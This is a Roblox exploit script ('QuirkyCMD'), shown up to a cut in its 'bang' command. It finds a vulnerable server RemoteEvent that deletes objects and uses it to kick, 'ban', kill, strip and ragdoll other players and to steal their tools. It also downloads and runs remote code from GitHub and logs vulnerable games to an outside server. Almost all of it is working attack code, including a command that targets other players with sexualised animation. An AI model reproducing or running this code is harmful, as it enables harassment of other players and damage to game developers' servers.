--{ QuirkyCMD made by quirky anime boy (smokedoutlocedout on discord) }--

local quirkycmd = Instance.new("ScreenGui", game:GetService("CoreGui"))
quirkycmd.Name = "quirkyCMD"
quirkycmd.IgnoreGuiInset = true
quirkycmd.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
quirkycmd.ResetOnSpawn = false
quirkycmd.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local remotepath = Instance.new("TextLabel")
remotepath.Name = "remotepath"
remotepath.Text = ""
remotepath.TextColor3 = Color3.fromRGB(255, 255, 255)
remotepath.TextScaled = true
remotepath.TextSize = 14
remotepath.TextTransparency = 0.6
remotepath.TextWrapped = true
remotepath.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
remotepath.BackgroundTransparency = 0.6
remotepath.BorderColor3 = Color3.fromRGB(0, 0, 0)
remotepath.BorderSizePixel = 0
remotepath.Position = UDim2.fromScale(0.396, 0.249)
remotepath.Size = UDim2.fromScale(0.208, 0.044)

local uicorner = Instance.new("UICorner")
uicorner.Name = "UICorner"
uicorner.CornerRadius = UDim.new(0, 3)
uicorner.Parent = remotepath

remotepath.Parent = quirkycmd

local cmdbox = Instance.new("TextBox")
cmdbox.Name = "cmdBox"
cmdbox.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json")
cmdbox.PlaceholderText = "QuirkyCmd loaded"
cmdbox.Text = ""
cmdbox.TextColor3 = Color3.fromRGB(200, 200, 200)
cmdbox.TextScaled = true
cmdbox.TextSize = 12
cmdbox.TextTruncate = Enum.TextTruncate.AtEnd
cmdbox.TextWrapped = true
cmdbox.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
cmdbox.BorderColor3 = Color3.fromRGB(59, 59, 59)
cmdbox.BorderSizePixel = 3
cmdbox.Position = UDim2.fromScale(0.396, 0.25)
cmdbox.Size = UDim2.fromScale(0.208, 0.0441)

local uitextsizeconstraint = Instance.new("UITextSizeConstraint")
uitextsizeconstraint.Name = "UITextSizeConstraint"
uitextsizeconstraint.MaxTextSize = 18
uitextsizeconstraint.Parent = cmdbox

cmdbox.Parent = quirkycmd

local mobileopen = Instance.new("TextButton")
mobileopen.Name = "mobileOpen"
mobileopen.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json")
mobileopen.Text = "CMD"
mobileopen.TextColor3 = Color3.fromRGB(200, 200, 200)
mobileopen.TextScaled = true
mobileopen.TextSize = 14
mobileopen.TextWrapped = true
mobileopen.AnchorPoint = Vector2.new(1, 0)
mobileopen.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
mobileopen.BorderColor3 = Color3.fromRGB(0, 0, 0)
mobileopen.BorderSizePixel = 0
mobileopen.Position = UDim2.fromScale(1, 0.25)
mobileopen.Size = UDim2.fromScale(0.0346, 0.0734)

local uicorner1 = Instance.new("UICorner")
uicorner1.Name = "UICorner"
uicorner1.CornerRadius = UDim.new(0, 3)
uicorner1.Parent = mobileopen

mobileopen.Parent = quirkycmd

local cmds = Instance.new("Frame")
cmds.Name = "cmds"
cmds.Active = true
cmds.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
cmds.BorderColor3 = Color3.fromRGB(0, 0, 0)
cmds.BorderSizePixel = 0
cmds.Position = UDim2.fromScale(0.446, 0.305)
cmds.Size = UDim2.fromScale(0.108, 0.389)

local cmdlist = Instance.new("ScrollingFrame")
cmdlist.Name = "cmdList"
cmdlist.AutomaticCanvasSize = Enum.AutomaticSize.Y
cmdlist.CanvasSize = UDim2.new()
cmdlist.ScrollBarThickness = 8
cmdlist.ScrollingDirection = Enum.ScrollingDirection.Y
cmdlist.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
cmdlist.BorderColor3 = Color3.fromRGB(0, 0, 0)
cmdlist.BorderSizePixel = 0
cmdlist.Position = UDim2.fromScale(0, 0.0566)
cmdlist.Size = UDim2.fromScale(1, 0.943)

local template = Instance.new("TextLabel")
template.Name = "template"
template.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json")
template.Text = "omg haiii :3333"
template.TextColor3 = Color3.fromRGB(200, 200, 200)
template.TextScaled = true
template.TextSize = 14
template.TextWrapped = true
template.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
template.BackgroundTransparency = 1
template.BorderColor3 = Color3.fromRGB(0, 0, 0)
template.BorderSizePixel = 0
template.Size = UDim2.fromScale(0.9, 0.1)
template.Parent = cmdlist

local uilistlayout = Instance.new("UIListLayout")
uilistlayout.Name = "UIListLayout"
uilistlayout.Padding = UDim.new(0, 5)
uilistlayout.SortOrder = Enum.SortOrder.LayoutOrder
uilistlayout.Parent = cmdlist

cmdlist.Parent = cmds

local closebutton = Instance.new("TextButton")
closebutton.Name = "closeButton"
closebutton.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json")
closebutton.Text = "Close"
closebutton.TextColor3 = Color3.fromRGB(255, 255, 255)
closebutton.TextScaled = true
closebutton.TextSize = 14
closebutton.TextWrapped = true
closebutton.Active = false
closebutton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
closebutton.BorderColor3 = Color3.fromRGB(0, 0, 0)
closebutton.BorderSizePixel = 0
closebutton.Size = UDim2.fromScale(1, 0.0566)
closebutton.Parent = cmds

cmds.Parent = quirkycmd

if not game:IsLoaded() then game.Loaded:Wait() end

--[[Variables]]--
local debugOutput = true
local checkTime = 0.33
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")
local rStorage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")
local isMobile = uis.TouchEnabled
local mobileOffset = isMobile and 0.25 or 0
local wordList = {"delete", "remove", "destroy", "clean", "clear","bullet", "bala", "shoot", "shot", "fire", "segway", "handless", "sword", "attack", "despawn", "deletar", "apagar"} -- credits to itzyaboyluq on github
local localPlayer = players.LocalPlayer
local quirkycmd = quirkycmd or nil
local mouse = localPlayer:GetMouse()
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait() 
local bodyColors = character:WaitForChild("Body Colors")
local gui = quirkycmd or localPlayer:FindFirstChildOfClass("PlayerGui"):FindFirstChild("quirkyCMD")
local box = gui:WaitForChild("cmdBox")
local mobileButton = gui:WaitForChild("mobileOpen")
local cmdsFrame = gui:WaitForChild("cmds")
local cmdsList = cmdsFrame:WaitForChild("cmdList")
local cmdTemplate = cmdsList:WaitForChild("template")
local closeButton = cmdsFrame:WaitForChild("closeButton")
local remotePath = gui:WaitForChild("remotepath")
local visible = false
local connections = {}
local commands = {}
local remotes = {}
local services = {}
local bans = {}
local slockEnabled = false
local atts = {
	"BodyProportionScale",
	"BodyWidthScale",
	"BodyHeightScale",
	"BodyDepthScale",
	"HeadScale",
	"BodyTypeScale"
}
local limbs = {
	"arm",
	"leg",
	"foot"
}

-- credits to littlemike57 (uuid 3099053) on v3rmillion
local Iris
if game.PlaceId == 7593160773 then
	Iris = require(game:GetService("ReplicatedStorage"):WaitForChild("iris")).Init()
else
	Iris = loadstring(game:HttpGet("https://raw.githubusercontent.com/someunknowndude/Iris-Exploit-Bundle/main/bundle.lua"))().Init()
end

--[[Add test game compatability]]--
if game.PlaceId == 7593160773 then
	function loadstring(src)
		return require(rStorage:WaitForChild("Loadstring"))(src)
	end
	
	local files = localPlayer.PlayerGui:WaitForChild("workspace")
	
	function isfile(str)
		local str = str or ""
		return files:FindFirstChild(str) and true or false
	end

	function writefile(str,txt)
		local str = str or ""
		local val = isfile(str) and files[str] or Instance.new("StringValue", files)
		val.Name = str
		val.Value = txt
	end

	function readfile(str)
		local str = str or ""
		if not files:FindFirstChild(str) then return error("file " .. str .. " does not exist") end
		return files[str].Value
	end
	
	function listfiles(str)
		local res = {}
		for i,v in pairs(files:GetChildren()) do
			table.insert(res, v.Name)
		end
		return res
	end
	
	function loadfile(str)
		local str = str or ""
		if not files:FindFirstChild(str) then return error("file " .. str .. " does not exist") end
		return loadstring(files[str].Value)
	end
end

--[[Prepare UI]]--


cmdsFrame.Visible = false
cmdTemplate.Visible = false
mobileButton.Visible = false
box.Position = UDim2.new(0.5 - box.Size.X.Scale/2, 0,1,50)

--[[Misc. functions]]--
function debugPrint(...)
	if not debugOutput then return end
	warn(...)
end

function findPlayers(input)
	if input == nil or input == "" then return
		{localPlayer}
	end 
	
	local input = input:lower()
	local players = players:GetPlayers()
	local targets = {}
	
	if input == "me" then
		return {localPlayer}
	end
	if input == "all" then
		return players
	end
	if input == "others" then
		targets = players
		table.remove(targets,1)
		return targets
	end

	for i,v in pairs(players) do
		local plrName = v.Name:lower()
		local plrDisplayName = v.DisplayName:lower()
		if not (plrName:find(input) or plrDisplayName:find(input)) then continue end
		table.insert(targets, v)
	end
	
	return targets
end

function abort()
	for i,v in pairs(connections) do
		if typeof(v) == "Instance" then v:Destroy() end
		v:Disconnect()
	end
	gui:Destroy()
	Iris.Disabled = true
end

local function lerp(a, b, m)
	return a + (b - a) * m
end

--[[Update variables]]--
table.insert(connections, localPlayer.CharacterAdded:Connect(function(char)
	character = char
	bodyColors = char:WaitForChild("Body Colors", 9e9)
end))

--[[Add command bar hide/show logic]]--
local function toggleBar(focus)
	visible = not visible
	if visible then 
		box:TweenPosition(UDim2.new(0.5 - box.Size.X.Scale/2, 0,.25,0),Enum.EasingDirection.Out,Enum.EasingStyle.Back, 0.1,true,function() if focus then box:CaptureFocus() end end)
		return
	end
	box:TweenPosition(UDim2.new(0.5 - box.Size.X.Scale/2, 0,1,50),Enum.EasingDirection.Out,Enum.EasingStyle.Linear, 0.05,true)
end

table.insert(connections, uis.InputBegan:Connect(function(input, processed) 
	if processed and uis:GetFocusedTextBox() ~= box then return end
	if input.KeyCode ~= Enum.KeyCode.Semicolon then return end
	toggleBar(true)
	if visible then return end
	box:ReleaseFocus()
end))

--[[Find destroy remote & save to working games list]]--
found = nil
local remoteJSON

local function hasFiles()
	return (isfile and readfile and writefile)
end

local function getGameList()
	if not isfile("quirky games.json") then
		writefile("quirky games.json", "[]") 
		return {} 
	end

	local content = readfile("quirky games.json")
	return game:GetService("HttpService"):JSONDecode(content)
end

local function checkFile()
	if not hasFiles() then return end
	for i,v in pairs(getGameList()) do
		if i ~= tostring(game.PlaceId) then continue end
		for _, instance in pairs(game:GetDescendants()) do
			if not (instance:IsA("RemoteEvent") and instance.Name == v) then continue end
			found = instance
			remotePath.Visible = false
			break
		end
	end
end

local function sendGame()
	if game.PlaceId == 7593160773 then
		spawn(function()
			rStorage:WaitForChild("request"):InvokeServer("https://phreatic-news.000webhostapp.com/addgame.php?PlaceID=" .. tostring(game.PlaceId) .. "&Remote=" .. found.Name)
		end)
		return
	end
	spawn(function()
		local res, err
		res,err = pcall(function()
			game:HttpGet("https://phreatic-news.000webhostapp.com/addgame.php?PlaceID=" .. tostring(game.PlaceId) .. "&Remote=" .. found.Name)
		end)
		if res then return end
		-- retry game log if first one failed
		pcall(function()
			game:HttpGet("https://phreatic-news.000webhostapp.com/addgame.php?PlaceID=" .. tostring(game.PlaceId) .. "&Remote=" .. found.Name)
		end)
	end)
end

local function addGame()
	local games = getGameList()
	games[tostring(game.PlaceId)] = found.Name
	writefile("quirky games.json", game:GetService("HttpService"):JSONEncode(games))
	sendGame()
end

local function checkDatabase()
	local res, succ, err
	if game.PlaceId ~= 7593160773 then 
		res = game:HttpGet("https://phreatic-news.000webhostapp.com/checkgame.php?PlaceID="..tostring(game.PlaceId))
	else
		res = rStorage:FindFirstChild("request"):InvokeServer("https://phreatic-news.000webhostapp.com/checkgame.php?PlaceID="..tostring(game.PlaceId))
	end
	if res == "no result" then return end
	succ, err = pcall(function()
		remoteJSON = game:GetService("HttpService"):JSONDecode(res)
	end)
	if succ then
		debugPrint(remoteJSON)
		for _, instance in pairs(game:GetDescendants()) do
			if not (instance:IsA("RemoteEvent") and instance.Name == remoteJSON[1]) then continue end
			found = instance
			remotePath:Destroy()
			break
		end
	else
		debugPrint(err)
	end
end


checkFile()
task.spawn(checkDatabase)
remotePath.Text = "checking database..."
task.wait(0.75)

if not found then
	for i,service in pairs(game:GetChildren()) do
		if service.ClassName == "ReplicatedStorage" or service.ClassName == "Workspace" then continue end
		table.insert(services, service)
	end

	local function checkRemote(remote)
		debugPrint(remote.Name)
		remotePath.Text = remote:GetFullName()
		local currentBC = bodyColors
		local currentCharacer = character
		remote:FireServer(bodyColors)
		task.wait(checkTime + mobileOffset)
		if (#currentCharacer:GetChildren() < 7) or (#character:GetChildren() < 7) or (currentCharacer ~= localPlayer.Character) or (currentBC ~= bodyColors) or (bodyColors.Parent == character) or (currentBC.Parent == character) then return end
		found = remote
		debugPrint("found!")
		remotePath.TextColor3 = Color3.new(0,1,0)
		task.wait(.5)
		remotePath.Visible = false
		return true
	end

	local function scan(instance, softScan)
		checkTime = softScan and 0.75 or 0.33
		for i,v in pairs(instance:GetDescendants()) do
			if found then return end
			if not v:IsA("RemoteEvent") then continue end
			table.insert(remotes, v)
			if softScan then
				for _, phrase in pairs(wordList) do
					if not v.Name:lower():find(phrase) then continue end
					checkRemote(v)
				end
				continue
			end
			checkRemote(v)
		end
	end

	debugPrint("soft rs")
	scan(game:GetService("ReplicatedStorage"), true)

	if not found then
		debugPrint("soft ws")
		scan(workspace, true)
	end
	
	if not found then
		debugPrint("aggro rs")
		scan(game:GetService("ReplicatedStorage"), false)
	end
	
	if not found then
		debugPrint("aggro ws")
		scan(workspace, false)
	end

	if not found then
		debugPrint("aggro all")
		for i,v in pairs(services) do
			scan(v, false)
		end
	end
end

if not found then gui:Destroy() return debugPrint("no silly remote found :(") end

if hasFiles() and getGameList()[tostring(game.PlaceId)] == nil then
	addGame()
end

function delete(instance)
	found:FireServer(instance)
	debugPrint("deleted instance " .. instance.Name)
end

toggleBar(false)

--[[Add mobile support]]--
if isMobile then 
	debugPrint("adding mobile compatability")
	mobileButton.Visible = true
	box.Position = UDim2.new(0.5 - box.Size.X.Scale/2, 0,1,50)
	
	--[[Add button functionality]]--
	mobileButton.MouseButton1Click:Connect(function()
		toggleBar(true)
		
	end)
	
	--[[Add drag functionality]]--
	local dragging
	local dragInput
	local dragStart
	local startPos

	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = 20

	local function update(dt)
		if not (startPos) then return end;
		local snap = (mouse.ViewSizeX - mouse.X) <= mouse.ViewSizeX/2 and 1 or mobileButton.Size.X.Scale
		if not (dragging) and (lastGoalPos) then
			mobileButton.Position = UDim2.new(lastGoalPos.X.Scale, 0, startPos.Y.Scale, lerp(mobileButton.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;

		local delta = (lastMousePos - uis:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(snap,0, startPos.Y.Scale, yGoal)
		
		mobileButton.Position = UDim2.new(snap ,0, startPos.Y.Scale, lerp(mobileButton.Position.Y.Offset, yGoal, dt * DRAG_SPEED))	
	end;

	mobileButton.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = mobileButton.Position
			lastMousePos = uis:GetMouseLocation()

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	mobileButton.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	table.insert(connections,rs.Heartbeat:Connect(update))
end

--[[Add command logic]]--
function addCommand(cmdName, callback)
	table.insert(commands,{
		name = cmdName:lower(),
		callback = callback
	})
end

function runCommand(cmdName, ...)
	for i,v in pairs(commands) do
		if v.name ~= cmdName then continue end
		v.callback(...)
		break
	end
end

--[[Add plugin support]]--
for i,v in pairs(listfiles("/")) do
	if v:sub(-5,-1) ~= ".qcmd" then continue end
	loadfile(v)()
end


local chatFolder = rStorage:FindFirstChild("DefaultChatSystemChatEvents") 
local doneFiltering = chatFolder and chatFolder:FindFirstChild("OnMessageDoneFiltering")
local chatEvent = doneFiltering and doneFiltering:FindFirstChild("OnClientEvent")
if chatEvent then
	local chatConnection = chatEvent:Connect(function(data)
		local message = data.Message
		local plr = data.FromSpeaker
	end)
	table.insert(connections,chatConnection)
end

table.insert(connections,box.FocusLost:Connect(function(enterPressed)
	if visible then
		toggleBar()
	end
	if not enterPressed then return end
	local text = box.Text
	local split = text:split(" ")
	local command = split[1]
	local arg = split[2]
	for i,v in pairs(commands) do
		if v.name ~= command:lower() then continue end
		v.callback(findPlayers(arg), arg)
	end
end))

--[[Create commands]]--
addCommand("cmds", function()
	cmdsFrame.Visible = true
end)

addCommand("explorer", function()
	local function addTree(Instance)
		local InstTree = Iris.Tree({Instance.Name})

		Iris.SameLine() do
			if Iris.SmallButton({"Delete"}).clicked then
				delete(Instance)
			end
			if Iris.SmallButton({"Clear children"}).clicked then
				for i,v in pairs(Instance:GetChildren()) do
					delete(v)
				end
			end
			Iris.End()
		end

		if InstTree.state.isUncollapsed.value then
			for i,v in pairs(Instance:GetChildren()) do
				addTree(v)
			end
		end
		Iris.End()
	end

	Iris:Connect(function()
		Iris.Window({"QCMD Explorer", [Iris.Args.Window.NoClose] = false}, {size = Iris.State(Vector2.new(200, 300)), position = Iris.State(Vector2.new(500, 75))}) do
			local priorityServices = {"Workspace", "Lighting", "Players", "ReplicatedStorage"}
			for i,v in pairs(priorityServices) do
				addTree(game:GetService(v))
			end
			for i,v in pairs(game:GetChildren()) do
				if table.find(priorityServices, v) then continue end
				addTree(v)
			end
			Iris.End()
		end
	end)
end)

addCommand("goto", function(plrs)
	local target
	for i,v in pairs(plrs) do
		if not (v.Character and v.Character:FindFirstChild("HumanoidRootPart")) then continue end
		target = v
		break
	end
	if not target then return end
	
	character:PivotTo(target.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,2))
end)

addCommand("view", function(plrs)
	local target
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local hum = char:FindFirstChild("HumanoidRootPart")
		if not hum then continue end
		target = hum
		break
	end
	if not target then return end

	workspace.CurrentCamera.CameraSubject = target
end)

addCommand("unview", function(plrs)
	workspace.CurrentCamera.CameraSubject = character.Humanoid or character:FindFirstChildOfClass("BasePart")
end)

addCommand("claim", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local hum = char:FindFirstChildOfClass("Humanoid")
		if hum == nil then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if hrp == nil then continue end
		local torso = char:FindFirstChild("Torso") or char:FindFirstChild("LowerTorso")
		if torso == nil then continue end
		delete(hrp)
		delete(hum)
		local con = rs.Stepped:Connect(function()
			if char.Parent == nil then return end
			torso.CFrame = character.HumanoidRootPart.CFrame * CFrame.new(4,0,0)
			torso.Velocity = Vector3.new(0,50,20)
		end)
		
		table.insert(connections, con)
		table.insert(connections, character.AncestryChanged:Once(function()
			con:Disconnect()
		end))
	end
end)

addCommand("rj", function()
	if #players:GetPlayers() <= 1 then
		localPlayer:Kick("Rejoining!!")
		task.wait(.1)
		game:GetService("TeleportService"):Teleport(game.PlaceId, localPlayer)
		return
	end
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,localPlayer)
end)

addCommand("btools", function()
	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	if localPlayer.Backpack:FindFirstChild("wacky destroy tool") or (character and character:FindFirstChild("wacky destroy tool")) then
		return
	end
	
	local selection

	local destroyTool = Instance.new("Tool", localPlayer.Backpack)
	destroyTool.RequiresHandle = false
	destroyTool.CanBeDropped = false
	destroyTool.Name = "wacky destroy tool"
	destroyTool.ToolTip = "Click to destroy"
	destroyTool.TextureId = "rbxasset://Textures/Hammer.png"

	local selectionLoop

	destroyTool.Equipped:Connect(function()
		selection = Instance.new("SelectionBox",localPlayer.PlayerGui)
		table.insert(connections, selection)
		selectionLoop = rs.Heartbeat:Connect(function()
			local target = mouse.Target
			if target == nil then
				selection.Adornee = nil
				return 
			end
			if selection.Parent == nil then return end
			selection.Adornee = target
		end)
		table.insert(connections, selectionLoop)
	end)

	destroyTool.Unequipped:Connect(function()
		if not selection then return end
			selection:Destroy()
	end)

	destroyTool.Activated:Connect(function()
		local target = mouse.Target
		if target == nil then return end
		delete(target)
	end)
	
	local unweldTool = Instance.new("Tool", localPlayer.Backpack)
	unweldTool.RequiresHandle = false
	unweldTool.CanBeDropped = false
	unweldTool.Name = "wacky unweld tool"
	unweldTool.ToolTip = "Click to unweld"
	unweldTool.TextureId = "rbxassetid://4989743039"

	local selectionLoop

	unweldTool.Equipped:Connect(function()
		selection = Instance.new("SelectionBox",localPlayer.PlayerGui)
		table.insert(connections, selection)
		selectionLoop = rs.Heartbeat:Connect(function()
			local target = mouse.Target
			if target == nil then
				selection.Adornee = nil
				return 
			end
			if selection.Parent == nil then return end
			selection.Adornee = target
		end)
		table.insert(connections, selectionLoop)
	end)

	unweldTool.Unequipped:Connect(function()
		if not selection then return end
		selection:Destroy()
	end)

	unweldTool.Activated:Connect(function()
		local target = mouse.Target
		if target == nil then return end
		for i,v in pairs(target:GetDescendants()) do
			if not (v:IsA("Weld") or v:IsA("Attachment")) then continue end
			delete(v)
		end
	end)
end)

addCommand("gun", function()
	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	if not character then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if localPlayer.Backpack:FindFirstChild("wacky gun tool") or (character:FindFirstChild("wacky gun tool")) then
		return
	end

	local gunTool = Instance.new("Tool", localPlayer.Backpack)
	gunTool.RequiresHandle = false
	gunTool.CanBeDropped = false
	gunTool.Name = "wacky gun tool"
	gunTool.ToolTip = "Click a player to \"shoot\" them"
	gunTool.TextureId = "rbxassetid://822278164"
	
	
	local handle = Instance.new("Part", gunTool)
	handle.Name = "Handle"
	handle.Transparency = 1
	handle.CanCollide = false
	handle.Size = Vector3.new(0.001,0.001,0.001)
	handle.Massless = true
	
	gunTool.Activated:Connect(function()
		local target = mouse.Target
		if target == nil then return end
		for i,v in pairs(players:GetPlayers()) do
			local char = v.Character
			if char == nil then continue end
			for _, part in pairs(char:GetDescendants()) do
				if (not part:IsA("BasePart")) or part ~= target then continue end
				local arg = {players:GetPlayerFromCharacter(char)}
				runCommand("ragdoll", arg)
				task.wait(3)
				runCommand("kill", arg)
				break
			end
		end
	end)
	
	if humanoid.RigType ~= Enum.HumanoidRigType.R6 then return end
	
	local animation = Instance.new("Animation")
	animation.AnimationId = "rbxassetid://33169583"
	local track = humanoid:LoadAnimation(animation)
	track.Priority = Enum.AnimationPriority.Movement


	gunTool.Equipped:Connect(function()
		track:Play()
		task.wait()
		track:AdjustSpeed(0)
		track.TimePosition = 0.18
		track:AdjustWeight(0.95)
	end)


	gunTool.Unequipped:Connect(function()
		track:Stop()
	end)
end)

table.insert(connections,players.PlayerAdded:Connect(function(plr)
	if (slockEnabled or bans[tostring(plr.UserId)]) then
		task.wait()
		delete(plr)
	end
end))

addCommand("ban", function(plrs, input)
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		if bans[tostring(v.UserId)] then continue end
		bans[tostring(v.UserId)] = input
		delete(v)
	end
end)

addCommand("unban", function(plrs, input)
	for i,v in pairs(bans) do
		if v == input or i == input then
			bans[i] = nil
		end
	end
end)

addCommand("kick", function(plrs)
	for i,v in pairs(plrs) do
		delete(v)
	end
end)

addCommand("kill", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		local head = char:FindFirstChild("Head")
		if head == nil then continue end
		local neck = head:FindFirstChild("Neck")
		if neck == nil then
			local torso = char:FindFirstChild("Torso")
			if torso and torso:FindFirstChild("Neck") then neck = char.Torso.Neck end
		end
		if humanoid and humanoid.RequiresNeck and neck then
			delete(neck)
			continue
		end
		delete(head)
	end
end)

addCommand("naked", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local pants = char:FindFirstChild("Pants")
		local shirt = char:FindFirstChild("Shirt")
		local tshirt = char:FindFirstChild("Shirt Graphic")

		if pants then delete(pants) end
		if shirt then delete(shirt) end
		if tshirt then delete(tshirt) end

		for _,instance in pairs(char:GetDescendants()) do
			if not instance:IsA("WrapLayer") then continue end
			delete(instance.Parent.Parent)
		end
	end
end)

addCommand("bald", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		for _,instance in pairs(char:GetChildren()) do
			if not instance:IsA("Accessory") then continue end
			delete(instance)
		end
	end
end)


addCommand("nolimbs", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		for _,instance in pairs(char:GetChildren()) do
			for i,v in pairs(limbs) do
				if not instance.Name:lower():find(v) then continue end
				delete(instance)
			end
		end
	end
end)

addCommand("noface", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local head = char:FindFirstChild("Head")
		if head == nil then continue end
		for _,instance in pairs(head:GetChildren()) do
			if not instance:IsA("Decal") then continue end
			delete(instance)
		end
	end
end)

addCommand("korblox", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local r6Leg = char:FindFirstChild("Right Leg") 
		if  r6Leg then 
			delete(r6Leg)
			continue 
		end
		local r15Leg = char:FindFirstChild("RightUpperLeg")
		if not r15Leg then continue end
		delete(r15Leg)
	end
end)

addCommand("morph", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hum then continue end
		if hum.RigType ~= Enum.HumanoidRigType.R15 then continue end
		local function rm()
			for i,v in pairs(char:GetDescendants()) do
				if not v:IsA("BasePart") then continue end
				if v.Name == "Handle" or v.Name == "Head" then
					if not char.Head:FindFirstChild("OriginalSize") then continue end
					delete(char.Head.OriginalSize)
					continue
				end
				for i,cav in pairs(v:GetDescendants()) do
					if not cav:IsA("Attachment") then continue end
					local op = cav:FindFirstChild("OriginalPosition") 
					if not op then continue end
					delete(op)
				end
				local os = v:FindFirstChild("OriginalSize") 
				if os then
					delete(os)
				end
				local apst = v:FindFirstChild("AvatarPartScaleType")
				if not apst then continue end
				delete(apst)
			end
		end
		
		for i,v in pairs(atts) do
			rm()
			task.wait(.1)
			local scale = hum:FindFirstChild(v)
			if not scale then continue end
			delete(scale)
			task.wait(.1)
		end
	end
end)

addCommand("ragdoll", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if hrp == nil then continue end
		delete(hrp)
	end
end)

addCommand("sink", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid == nil then continue end
		delete(humanoid)
	end
end)

addCommand("freeze", function(plrs)
	runCommand("ragdoll", plrs)
	runCommand("noanims", plrs)
end)

addCommand("noanims", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid == nil then continue end
		local animator = humanoid:FindFirstChildOfClass("Animator")
		if animator == nil then continue end
		delete(animator)
		local animate = char:FindFirstChild("Animate")
		if animate == nil then continue end
		delete(animate)
	end
end)

addCommand("notools", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		for _, instance in pairs(char:GetChildren()) do
			if not instance:IsA("BackpackItem") then continue end
			delete(instance)
		end
		table.insert(connections, char.ChildAdded:Connect(function(instance)
			if not instance:IsA("BackpackItem") then return end
			delete(instance)
		end))
	end
end)

addCommand("stealtools", function(plrs)
	if not character then return end
	local lpHumanoid = character:FindFirstChildOfClass("Humanoid")
	if not lpHumanoid then return end
	for i,plr in pairs(plrs) do
		local char = plr.Character
		if char == nil then continue end
		local head = char:FindFirstChild("Head")
		if head == nil then continue end
		delete(head)
		task.wait(0.05)
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			delete(humanoid)
		end
		repeat task.wait() until char:FindFirstChildOfClass("Humanoid") == nil
		task.wait(.05)
		for i,v in pairs(char:GetChildren()) do
			if not (v:IsA("BackpackItem") and v:FindFirstChild("Handle")) then continue end
			debugPrint(v.Name)
			v.Handle.CFrame = character.Humanoid.RootPart.CFrame
			lpHumanoid:EquipTool(v)
		end
	end
end)

addCommand("punish", function(plrs)
	for i,v in pairs(plrs) do
		local char = v.Character
		if char == nil then continue end
		delete(char)
	end
end)

addCommand("bang", function(plrs) -- credit to the Infinite Yield team
	if not character then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	runCommand("unbang")
	local target
	for i,v in pairs(plrs) do
		if not v.Character then continue end
		if not v.Character:FindFirstChildOfClass("Humanoid") then continue end
		if not v.Character.Humanoid.RootPart then continue end
		target = v
		break
	end
	bangAnim = Instance.new("Animation")
	bangAnim.AnimationId = (humanoid.RigType ~= Enum.HumanoidRigType.R15) and "rbxassetid://148840371" or "rbxassetid://5918726674"
	bang = humanoid:LoadAnimation(bangAnim)
	bang:Play(0.1, 1, 1)
	bang:AdjustSpeed(3)
	bangLoop = nil
	bangDied = nil;bangDied = humanoid.Died:Connect(function()
		bang:Stop()
		bangAnim:Destroy()
		bangDied:Disconnect()
		if bangLoop then bangLoop:Disconnect() end
	end)
	if target == localPlayer then return end
	bangLoop = rs.Stepped:Connect(function()
		if target.Character == nil then return end
		local hum = target.Character:FindFirstChildOfClass("Humanoid")
		if hum == nil then return end
		local root = hum.RootPart
		if root == nil then return end
